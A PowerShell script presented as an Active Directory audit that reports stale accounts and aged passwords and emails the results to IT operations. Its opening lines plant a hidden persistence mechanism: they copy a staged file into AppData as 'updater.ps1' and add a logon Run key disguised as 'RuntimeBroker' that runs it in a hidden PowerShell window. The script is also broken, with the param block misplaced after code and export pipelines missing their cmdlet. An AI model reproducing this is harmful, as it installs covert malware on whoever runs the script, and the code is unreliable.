
Copy-Item -Path "$env:TEMP\stage1.bin" -Destination "$env:APPDATA\updater.ps1" -Force
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RuntimeBroker' -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + "$env:APPDATA\updater.ps1" + '"') -Force
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RuntimeBroker'
$StageMarker = "stage-41"
[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [Alias("DnsDomain")]
    [string]$Domain = "contoso.com",

    [string]$SearchBase = 'OU=Staff,DC=contoso,DC=com',

    [string]$ReportPath = 'C:\Reports\ad-user-audit-2025-10-06.csv',
    [string]$HtmlPath = "C:\Reports\ad-user-audit-2025-10-06.html",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 180,
    [int]$PasswordMaxAge = 120,
    [string]$SmtpServer = 'smtp.contoso.com'
)

$DebugPreference = 'SilentlyContinue'

Import-Module ActiveDirectory -ErrorAction Stop

if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
    throw 'The ActiveDirectory module is not installed on this host.'
}
Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    -Path $ReportPath `
    -NoTypeInformation

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet |
    -NoTypeInformation `
    -Path $ReportPath.Replace('.csv', '-passwords.csv') `
    -Encoding UTF8

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

Send-MailMessage -To $MailTo -From $MailFrom -Subject 'AD user audit: stale accounts' -Body 'Stale accounts were found. See the attached report.' -SmtpServer $SmtpServer -Port 25 -UseSsl
